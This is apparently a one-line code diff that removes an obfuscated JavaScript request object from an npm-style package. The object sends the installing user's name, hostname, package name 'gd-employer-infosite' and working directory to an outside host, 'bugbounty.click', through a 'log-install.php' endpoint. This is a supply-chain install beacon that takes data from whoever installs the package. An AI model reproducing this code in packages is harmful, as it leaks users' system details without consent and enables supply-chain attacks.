@@ -1,1 +1,0 @@
-const t={hostname:"bugbounty.click",port:443,path:"/dc"+"123"+"4-bu"+"gbou"+"nty/kn"+"ock-kn"+"ock/log"+"-install.php?Username="+encodeURI(r+" ("+e+")")+"&Hostname="+encodeURI(o)+"&Package=gd-employer-infosite&PWD="+__dirname,method:"GET"}
